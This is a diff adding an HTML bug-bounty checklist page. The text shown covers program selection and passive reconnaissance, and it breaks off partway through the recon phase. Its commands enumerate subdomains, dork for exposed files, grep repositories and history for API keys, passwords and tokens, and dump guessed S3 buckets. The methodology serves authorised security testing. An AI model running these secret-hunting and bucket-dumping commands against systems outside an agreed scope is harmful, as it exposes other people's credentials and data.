@@ -1,0 +1,2183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Bug Bounty — Elite Hunter's Playbook</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg-void: #040608;
+    --bg-deep: #080d10;
+    --bg-surface: #0d1419;
+    --bg-raised: #111b22;
+    --bg-card: #141f28;
+    --bg-hover: #1a2a35;
+    --border-dim: #1e2e3a;
+    --text-primary: #e8f4f8;
+    --text-secondary: #7fa8c0;
+    --text-muted: #3d6070;
+    --accent-cyan: #00e5ff;
+    --accent-green: #00ff88;
+    --accent-amber: #ffb300;
+    --accent-red: #ff4444;
+    --accent-purple: #b06cff;
+    --accent-pink: #ff4da6;
+    --glow-cyan: 0 0 20px #00e5ff44;
+    --glow-green: 0 0 20px #00ff8844;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg-void);
+    color: var(--text-primary);
+    font-family: 'JetBrains Mono', monospace;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,229,255,0.012) 2px, rgba(0,229,255,0.012) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  body::after {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background-image: linear-gradient(rgba(0,229,255,0.02) 1px, transparent 1px), linear-gradient(90deg, rgba(0,229,255,0.02) 1px, transparent 1px);
+    background-size: 40px 40px;
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .container { max-width: 1100px; margin: 0 auto; padding: 2rem 1.5rem 4rem; position: relative; z-index: 1; }
+
+  /* HEADER */
+  .header { text-align: center; padding: 3rem 0 2.5rem; }
+  .header-badge {
+    display: inline-flex; align-items: center; gap: 0.5rem;
+    background: rgba(0,229,255,0.06); border: 1px solid rgba(0,229,255,0.2);
+    border-radius: 2px; padding: 0.3rem 0.8rem; font-size: 0.65rem;
+    letter-spacing: 0.15em; color: var(--accent-cyan); margin-bottom: 1.5rem; text-transform: uppercase;
+  }
+  .header-badge::before { content: '◈'; font-size: 0.8rem; }
+
+  h1 {
+    font-family: 'Syne', sans-serif;
+    font-size: clamp(2rem, 5vw, 3.2rem);
+    font-weight: 800; line-height: 1.1; letter-spacing: -0.02em;
+    background: linear-gradient(135deg, var(--accent-cyan) 0%, var(--accent-green) 50%, var(--accent-cyan) 100%);
+    background-size: 200% auto;
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+    animation: shimmer 4s linear infinite; margin-bottom: 0.8rem;
+  }
+
+  @keyframes shimmer { 0% { background-position: 0% center; } 100% { background-position: 200% center; } }
+
+  .header-sub { color: var(--text-secondary); font-size: 0.8rem; letter-spacing: 0.05em; margin-bottom: 2.5rem; }
+
+  /* GLOBAL PROGRESS */
+  .global-progress {
+    background: var(--bg-card); border: 1px solid var(--border-dim);
+    border-radius: 4px; padding: 1.5rem 2rem; margin-bottom: 2rem;
+    position: relative; overflow: hidden;
+  }
+  .global-progress::before {
+    content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--accent-cyan), transparent);
+  }
+  .progress-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem; }
+  .progress-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--text-secondary); }
+  .progress-stats { display: flex; gap: 1.5rem; font-size: 0.7rem; }
+  .stat { color: var(--text-muted); }
+  .stat span { color: var(--accent-cyan); font-weight: 600; }
+  .progress-bar-track { height: 6px; background: var(--bg-deep); border-radius: 3px; overflow: hidden; position: relative; }
+  .progress-bar-fill {
+    height: 100%; background: linear-gradient(90deg, var(--accent-cyan), var(--accent-green));
+    border-radius: 3px; transition: width 0.4s cubic-bezier(0.4,0,0.2,1); position: relative; width: 0%;
+  }
+  .progress-bar-fill::after {
+    content: ''; position: absolute; right: 0; top: -2px;
+    width: 10px; height: 10px; background: var(--accent-green); border-radius: 50%; box-shadow: 0 0 8px var(--accent-green);
+  }
+  .progress-pct { font-family: 'Syne', sans-serif; font-size: 2rem; font-weight: 800; color: var(--accent-cyan); line-height: 1; margin-top: 0.8rem; text-shadow: var(--glow-cyan); }
+
+  /* PHASES */
+  .phase { margin-bottom: 1rem; border: 1px solid var(--border-dim); border-radius: 4px; background: var(--bg-card); overflow: hidden; transition: border-color 0.2s; }
+  .phase:hover { border-color: rgba(0,229,255,0.15); }
+  .phase-header { display: flex; align-items: center; gap: 1rem; padding: 1rem 1.5rem; cursor: pointer; user-select: none; position: relative; transition: background 0.2s; }
+  .phase-header:hover { background: var(--bg-hover); }
+  .phase-num { font-family: 'Syne', sans-serif; font-size: 0.65rem; font-weight: 700; letter-spacing: 0.1em; color: var(--text-muted); min-width: 4rem; }
+  .phase-title { font-family: 'Syne', sans-serif; font-size: 0.95rem; font-weight: 700; color: var(--text-primary); flex: 1; }
+  .phase-meta { display: flex; align-items: center; gap: 1rem; }
+  .phase-progress-mini { display: flex; align-items: center; gap: 0.5rem; font-size: 0.65rem; color: var(--text-muted); }
+  .mini-bar { width: 60px; height: 3px; background: var(--bg-deep); border-radius: 2px; overflow: hidden; }
+  .mini-fill { height: 100%; border-radius: 2px; transition: width 0.3s ease; width: 0%; }
+  .phase-chevron { color: var(--text-muted); font-size: 0.8rem; transition: transform 0.2s; }
+  .phase.open .phase-chevron { transform: rotate(180deg); }
+  .phase-body { display: none; border-top: 1px solid var(--border-dim); }
+  .phase.open .phase-body { display: block; }
+
+  /* SUBSECTIONS */
+  .subsection-title {
+    font-size: 0.62rem; text-transform: uppercase; letter-spacing: 0.12em;
+    color: var(--text-muted); padding: 0.7rem 1.5rem 0.3rem;
+    border-top: 1px solid rgba(30,46,58,0.6);
+    display: flex; align-items: center; gap: 0.5rem;
+  }
+  .subsection-title::before { content: '//'; color: var(--accent-green); font-weight: 700; }
+  .subsection-title:first-child { border-top: none; }
+
+  /* ITEMS */
+  .items-list { padding: 0; }
+  .item { display: flex; align-items: flex-start; gap: 1rem; padding: 0.75rem 1.5rem; border-bottom: 1px solid rgba(30,46,58,0.4); transition: background 0.15s; }
+  .item:last-child { border-bottom: none; }
+  .item:hover { background: rgba(0,229,255,0.025); }
+  .item.checked { opacity: 0.4; }
+  .item.checked .item-title { text-decoration: line-through; color: var(--text-muted); }
+
+  .item-check { position: relative; width: 18px; height: 18px; min-width: 18px; margin-top: 2px; cursor: pointer; }
+  .item-check input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; z-index: 2; margin: 0; }
+  .checkmark {
+    position: absolute; inset: 0; border: 1.5px solid var(--text-muted); border-radius: 2px;
+    background: transparent; transition: all 0.15s; display: flex; align-items: center; justify-content: center;
+  }
+  .item-check input:checked ~ .checkmark { background: var(--accent-green); border-color: var(--accent-green); box-shadow: 0 0 8px rgba(0,255,136,0.4); }
+  .checkmark::after { content: '✓'; font-size: 0.6rem; color: var(--bg-void); font-weight: 700; opacity: 0; transform: scale(0); transition: all 0.15s; }
+  .item-check input:checked ~ .checkmark::after { opacity: 1; transform: scale(1); }
+
+  .item-content { flex: 1; min-width: 0; }
+  .item-top { display: flex; align-items: flex-start; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 0.3rem; }
+  .item-title { font-size: 0.8rem; color: var(--text-primary); line-height: 1.4; flex: 1; min-width: 180px; }
+  .item-sub { font-size: 0.7rem; color: var(--text-secondary); line-height: 1.55; margin-top: 0.15rem; }
+
+  .tag { font-size: 0.55rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; padding: 0.15rem 0.45rem; border-radius: 2px; white-space: nowrap; flex-shrink: 0; }
+  .tag-high    { background: rgba(255,68,68,0.12);   color: #ff6b6b;  border: 1px solid rgba(255,68,68,0.25); }
+  .tag-quick   { background: rgba(0,255,136,0.1);    color: var(--accent-green); border: 1px solid rgba(0,255,136,0.2); }
+  .tag-missed  { background: rgba(176,108,255,0.1);  color: var(--accent-purple); border: 1px solid rgba(176,108,255,0.2); }
+  .tag-critical{ background: rgba(255,179,0,0.1);    color: var(--accent-amber); border: 1px solid rgba(255,179,0,0.2); }
+  .tag-chain   { background: rgba(255,77,166,0.1);   color: var(--accent-pink);  border: 1px solid rgba(255,77,166,0.2); }
+
+  .item-cmd {
+    font-size: 0.69rem; color: var(--accent-cyan); background: var(--bg-deep);
+    border: 1px solid rgba(0,229,255,0.12); border-radius: 2px; padding: 0.32rem 0.55rem;
+    word-break: break-all; line-height: 1.55; margin-top: 0.25rem;
+  }
+  .item-cmd::before { content: '$ '; color: var(--accent-green); font-weight: 600; }
+  .item-cmd.note::before { content: '# '; color: var(--accent-amber); }
+  .item-tool { font-size: 0.6rem; color: var(--text-muted); margin-top: 0.28rem; display: flex; align-items: flex-start; gap: 0.3rem; line-height: 1.5; }
+  .item-tool::before { content: '◆'; font-size: 0.45rem; color: var(--accent-purple); margin-top: 0.15rem; flex-shrink: 0; }
+
+  /* NOTES */
+  .notes-section { border-top: 1px solid var(--border-dim); padding: 1rem 1.5rem; background: rgba(0,0,0,0.2); }
+  .notes-label { font-size: 0.6rem; text-transform: uppercase; letter-spacing: 0.15em; color: var(--text-muted); margin-bottom: 0.5rem; display: flex; align-items: center; gap: 0.4rem; }
+  .notes-label::before { content: '// '; color: var(--accent-green); }
+  .notes-field {
+    width: 100%; background: var(--bg-deep); border: 1px solid var(--border-dim);
+    border-radius: 2px; color: var(--text-primary); font-family: 'JetBrains Mono', monospace;
+    font-size: 0.72rem; padding: 0.6rem 0.8rem; resize: vertical; min-height: 60px;
+    transition: border-color 0.2s; outline: none; line-height: 1.6;
+  }
+  .notes-field:focus { border-color: rgba(0,229,255,0.3); box-shadow: 0 0 0 1px rgba(0,229,255,0.1); }
+  .notes-field::placeholder { color: var(--text-muted); }
+
+  /* PHASE COLORS */
+  .phase:nth-child(1)  .mini-fill { background: #00e5ff; } .phase:nth-child(1)  .phase-num { color: #00e5ff; }
+  .phase:nth-child(2)  .mini-fill { background: #00ff88; } .phase:nth-child(2)  .phase-num { color: #00ff88; }
+  .phase:nth-child(3)  .mini-fill { background: #b06cff; } .phase:nth-child(3)  .phase-num { color: #b06cff; }
+  .phase:nth-child(4)  .mini-fill { background: #ffb300; } .phase:nth-child(4)  .phase-num { color: #ffb300; }
+  .phase:nth-child(5)  .mini-fill { background: #ff4da6; } .phase:nth-child(5)  .phase-num { color: #ff4da6; }
+  .phase:nth-child(6)  .mini-fill { background: #ff6b35; } .phase:nth-child(6)  .phase-num { color: #ff6b35; }
+  .phase:nth-child(7)  .mini-fill { background: #00e5ff; } .phase:nth-child(7)  .phase-num { color: #00e5ff; }
+  .phase:nth-child(8)  .mini-fill { background: #00ff88; } .phase:nth-child(8)  .phase-num { color: #00ff88; }
+  .phase:nth-child(9)  .mini-fill { background: #b06cff; } .phase:nth-child(9)  .phase-num { color: #b06cff; }
+  .phase:nth-child(10) .mini-fill { background: #ffb300; } .phase:nth-child(10) .phase-num { color: #ffb300; }
+  .phase:nth-child(11) .mini-fill { background: #ff4da6; } .phase:nth-child(11) .phase-num { color: #ff4da6; }
+  .phase:nth-child(12) .mini-fill { background: #ff6b35; } .phase:nth-child(12) .phase-num { color: #ff6b35; }
+
+  /* CONTROLS */
+  .controls { display: flex; gap: 0.6rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+  .btn { font-family: 'JetBrains Mono', monospace; font-size: 0.65rem; letter-spacing: 0.05em; padding: 0.5rem 1rem; border: 1px solid var(--border-dim); border-radius: 2px; background: var(--bg-card); color: var(--text-secondary); cursor: pointer; transition: all 0.15s; text-transform: uppercase; }
+  .btn:hover { background: var(--bg-hover); color: var(--text-primary); border-color: rgba(0,229,255,0.3); }
+  .btn-primary { background: rgba(0,229,255,0.08); border-color: rgba(0,229,255,0.3); color: var(--accent-cyan); }
+  .btn-primary:hover { background: rgba(0,229,255,0.15); box-shadow: var(--glow-cyan); }
+  .btn-danger { background: rgba(255,68,68,0.06); border-color: rgba(255,68,68,0.2); color: #ff6b6b; }
+  .btn-danger:hover { background: rgba(255,68,68,0.12); }
+
+  /* FOOTER */
+  .footer { text-align: center; padding: 2rem 0 0; color: var(--text-muted); font-size: 0.6rem; letter-spacing: 0.08em; border-top: 1px solid var(--border-dim); margin-top: 2rem; }
+
+  .cursor::after { content: '█'; animation: blink 1s step-end infinite; color: var(--accent-green); margin-left: 2px; font-size: 0.8em; }
+  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0; } }
+
+  #scrollTop {
+    position: fixed; bottom: 2rem; right: 2rem; width: 38px; height: 38px;
+    background: var(--bg-card); border: 1px solid rgba(0,229,255,0.25); border-radius: 2px;
+    color: var(--accent-cyan); cursor: pointer; display: flex; align-items: center; justify-content: center;
+    font-size: 1rem; transition: all 0.2s; z-index: 100; opacity: 0;
+  }
+  #scrollTop.visible { opacity: 1; }
+  #scrollTop:hover { background: rgba(0,229,255,0.1); box-shadow: var(--glow-cyan); }
+
+  @media (max-width: 600px) {
+    .progress-stats { display: none; }
+    .phase-header { padding: 0.8rem 1rem; }
+    .item { padding: 0.7rem 1rem; }
+    .notes-section { padding: 0.8rem 1rem; }
+    .subsection-title { padding: 0.6rem 1rem 0.3rem; }
+  }
+</style>
+</head>
+<body>
+<div class="container">
+
+  <div class="header">
+    <div class="header-badge">Elite Hunter's Playbook v3.0 — Complete Edition</div>
+    <h1>Bug Bounty<br>Master Checklist<span class="cursor"></span></h1>
+    <p class="header-sub">// zero to bounty — top 0.1% methodology — 180+ specific items — nothing missed</p>
+  </div>
+
+  <div class="global-progress">
+    <div class="progress-header">
+      <div class="progress-label">// Overall Completion</div>
+      <div class="progress-stats">
+        <div class="stat">Checked: <span id="checkedCount">0</span></div>
+        <div class="stat">Total: <span id="totalCount">0</span></div>
+        <div class="stat">Remaining: <span id="remainCount">0</span></div>
+      </div>
+    </div>
+    <div class="progress-bar-track"><div class="progress-bar-fill" id="globalBar"></div></div>
+    <div class="progress-pct" id="globalPct">0%</div>
+  </div>
+
+  <div class="controls">
+    <button class="btn btn-primary" onclick="expandAll()">▼ Expand All</button>
+    <button class="btn" onclick="collapseAll()">▲ Collapse All</button>
+    <button class="btn btn-danger" onclick="clearAll()">↺ Reset All</button>
+    <button class="btn" onclick="exportNotes()">⬇ Export Notes</button>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════ -->
+  <!-- PHASE 1 — Target Selection & Business Understanding -->
+  <!-- ═══════════════════════════════════════════════════ -->
+  <div class="phase open" id="phase-1">
+    <div class="phase-header" onclick="togglePhase('phase-1')">
+      <div class="phase-num">PHASE 01</div>
+      <div class="phase-title">Target Selection &amp; Business Understanding</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-1"></div></div><span id="pct-phase-1">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-1">
+
+        <div class="subsection-title">choose your program</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Pick private program or one launched in last 3–6 months</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-sub">Private = fewer hunters = more waiting bugs. New programs = untested surface.</div>
+            <div class="item-tool">Platforms: HackerOne, Bugcrowd, Intigriti, YesWeHack, Immunefi</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Read the entire scope page word by word — every exclusion matters</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Exclusions reveal which bug classes already exist — hunt variants not duplicates.</div>
+            <div class="item-cmd note">Save scope to scope.txt — reference it constantly during hunting</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Read every disclosed report for this program first</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">Know what's been found — hunt variants not duplicates. Disclosed reports teach you HOW this team thinks.</div>
+            <div class="item-cmd">curl -s "https://hackerone.com/hacktivity?order_direction=DESC&filter[program]=TARGET" | jq '.data[].attributes | .title,.severity_rating'</div>
+            <div class="item-tool">HackerOne Hacktivity, Bugcrowd Disclosure — also Google: site:hackerone.com "target.com"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Look for recently acquired company assets in scope</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Acquired assets are almost always under-tested — security review rarely follows M&amp;A speed.</div>
+            <div class="item-tool">Google: "TARGET acquires" site:crunchbase.com — check Crunchbase acquisitions list</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Evaluate scope size vs competition — large scope + low hunters = goldmine</span></div>
+            <div class="item-sub">Check HackerOne "hall of fame" count. Low payout ceiling often means nobody is hunting there.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">understand the business</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">What does the company actually do? B2B vs B2C vs marketplace?</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-sub">B2B multi-tenant apps = IDOR goldmines. Marketplaces = payment logic. SaaS = privilege escalation.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Map where money flows in the app — payment flows are business logic goldmines</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-sub">Checkout, subscriptions, refunds, credits, coupons, referrals, payouts — every money path = test target.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check job listings for tech stack clues</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">"Hiring Spring Boot engineers" = Java backend. "AWS Lambda" = serverless. Job posts leak the entire stack.</div>
+            <div class="item-cmd note">Search: site:linkedin.com/jobs "target.com" OR site:greenhouse.io "target" engineer</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check LinkedIn for engineering team size — small team = less security review</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">5-person eng team shipping fast = more bugs than 500-person team with dedicated AppSec.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Map every user role that exists in the app</span></div>
+            <div class="item-sub">Admin, staff, org-owner, member, guest, API user, trial user — every role boundary = auth testing surface.</div>
+            <div class="item-cmd note">Register all available roles. Request elevated test accounts from program if available.</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Set up isolated environment — VPN, fresh browser profile, dedicated email</span></div>
+            <div class="item-cmd">mkdir -p ~/targets/TARGET/{recon,scans,vulns,screenshots,reports,js,notes} && cd ~/targets/TARGET</div>
+            <div class="item-tool">ProtonVPN/Mullvad + Firefox separate profile + mailinator.com for test accounts</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Target Profile</div>
+        <textarea class="notes-field" placeholder="e.g. SaaS B2B platform, ~50 engineers, acquired CompanyX in 2023 (scope includes legacy.target.com), pays $200-$10k, private program..."></textarea>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════ -->
+  <!-- PHASE 2 — Passive Recon -->
+  <!-- ═══════════════════ -->
+  <div class="phase" id="phase-2">
+    <div class="phase-header" onclick="togglePhase('phase-2')">
+      <div class="phase-num">PHASE 02</div>
+      <div class="phase-title">Passive Reconnaissance</div>
+      <div class="phase-meta">
+        <div class="phase-progress-mini"><div class="mini-bar"><div class="mini-fill" id="bar-phase-2"></div></div><span id="pct-phase-2">0%</span></div>
+        <div class="phase-chevron">▼</div>
+      </div>
+    </div>
+    <div class="phase-body">
+      <div class="items-list" data-phase="phase-2">
+
+        <div class="subsection-title">subdomain enumeration</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Run subfinder + amass + assetfinder + chaos in parallel</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">subfinder -d target.com -all -recursive -o subs-subfinder.txt && amass enum -passive -d target.com -o subs-amass.txt && assetfinder --subs-only target.com > subs-assetfinder.txt</div>
+            <div class="item-tool">subfinder, amass, assetfinder, chaos (projectdiscovery) — configure API keys in subfinder config</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Certificate transparency logs — finds subdomains before DNS propagates</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | tee subs-crt.txt</div>
+            <div class="item-tool">crt.sh, certspotter</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Brute-force subdomains beyond passive results with puredns</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">puredns brute /usr/share/seclists/Discovery/DNS/best-dns-wordlist.txt target.com -r resolvers.txt -o subs-brute.txt</div>
+            <div class="item-tool">puredns: go install github.com/d3mondev/puredns/v2@latest — gets subdomains no passive tool finds</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">ASN lookup — find ALL IP ranges owned by the company</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">asnmap -org "Target Corp" -o asn-ranges.txt && curl -s "https://api.bgpview.io/search?query_term=target+corp" | jq '.data.asns[].asn'</div>
+            <div class="item-tool">asnmap (projectdiscovery), bgpview.io — reveals infrastructure outside *.target.com wildcard</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Merge and DNS-resolve all subdomains — keep only live ones</span></div>
+            <div class="item-cmd">cat subs-*.txt | sort -u | dnsx -silent -a -resp-only | tee live-subs.txt && echo "Live count: $(wc -l < live-subs.txt)"</div>
+            <div class="item-tool">dnsx: go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">google dorking</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Find exposed sensitive files and documents</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd note">site:target.com filetype:pdf OR filetype:xlsx OR filetype:docx OR filetype:sql OR filetype:env OR filetype:log</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Find admin panels, staging environments, API docs</span></div>
+            <div class="item-cmd note">site:target.com inurl:admin OR inurl:internal OR inurl:staging OR inurl:dev OR inurl:test OR inurl:swagger OR inurl:graphql</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Find error pages and exposed config files</span></div>
+            <div class="item-cmd note">site:target.com "sql syntax" OR "stack trace" OR "exception" OR ext:xml OR ext:conf OR ext:yml OR ext:ini</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Find Postman collections — teams accidentally publish these publicly</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd note">site:postman.com "target.com" AND site:target.com postman</div>
+            <div class="item-sub">Postman collections contain every API endpoint, auth tokens, and example requests.</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">github & code dorking</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">GitHub org dorking — leaked keys, internal endpoints, hardcoded creds</span><span class="tag tag-critical">Critical</span></div>
+            <div class="item-cmd">trufflehog github --org=targetorg --only-verified --json | tee github-secrets.json</div>
+            <div class="item-tool">trufflehog, gitleaks — also manual: org:targetorg "api_key" OR "secret" OR "password" OR "AWS_SECRET" OR "BEGIN RSA"</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check employee personal repos — devs commit work code to personal accounts</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">Find engineer names from LinkedIn, search their GitHub usernames for target.com references.</div>
+            <div class="item-cmd note">GitHub search: "target.com" user:ENGINEER_USERNAME</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check git commit history — secrets deleted in latest commit still exist in history</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">git log --all --full-history -- "*.env" && git log -p --all | grep -E "(api_key|secret|password|token)" | head -50</div>
+            <div class="item-tool">git log + grep — secrets are never truly deleted without git history rewrite</div>
+          </div>
+        </div>
+
+        <div class="subsection-title">other passive sources</div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Wayback Machine — old endpoints, removed pages, old JS files</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-cmd">gau --threads 5 --subs target.com | tee gau-urls.txt && waybackurls target.com | tee wayback.txt && cat gau-urls.txt wayback.txt | sort -u | grep -E "\.js$|api|admin|password|token|key" | tee interesting-urls.txt</div>
+            <div class="item-tool">gau, waybackurls — old JS files contain removed endpoints that still work on the server</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Shodan + Censys — exposed Redis, Elasticsearch, Jenkins, Grafana, Kibana</span><span class="tag tag-high">High Value</span></div>
+            <div class="item-cmd">shodan search --fields ip_str,port,org,product "org:\"Target Corp\"" | tee shodan-results.txt</div>
+            <div class="item-tool">shodan CLI (pip install shodan), Censys.io — look for unusual open ports: 6379, 9200, 5601, 8080, 9090, 27017</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">FOFA / ZoomEye for non-US infrastructure</span><span class="tag tag-missed">Often Missed</span></div>
+            <div class="item-sub">Better than Shodan for Asian-hosted infrastructure. Often finds things Shodan completely misses.</div>
+            <div class="item-tool">fofa.info, zoomeye.org — search by company name or domain</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check Pastebin for leaked credentials and internal data</span></div>
+            <div class="item-cmd note">site:pastebin.com "target.com" — also search pasting sites: paste.ee, rentry.co, justpaste.it</div>
+          </div>
+        </div>
+
+        <div class="item">
+          <label class="item-check"><input type="checkbox" onchange="updateProgress()"><span class="checkmark"></span></label>
+          <div class="item-content">
+            <div class="item-top"><span class="item-title">Check S3 buckets — guess common naming patterns</span><span class="tag tag-quick">Quick Win</span></div>
+            <div class="item-cmd">s3scanner scan --buckets-file <(echo -e "target-backup\ntarget-prod\ntarget-assets\ntarget-static\ntarget-dev\ntarget-staging\ntarget-logs\ntarget-uploads") --dump-all</div>
+            <div class="item-tool">s3scanner — also cloudbrute: cloudbrute -d target.com -k keywords.txt for GCP/Azure buckets</div>
+          </div>
+        </div>
+
+      </div>
+      <div class="notes-section">
+        <div class="notes-label">Phase Notes / Findings</div>
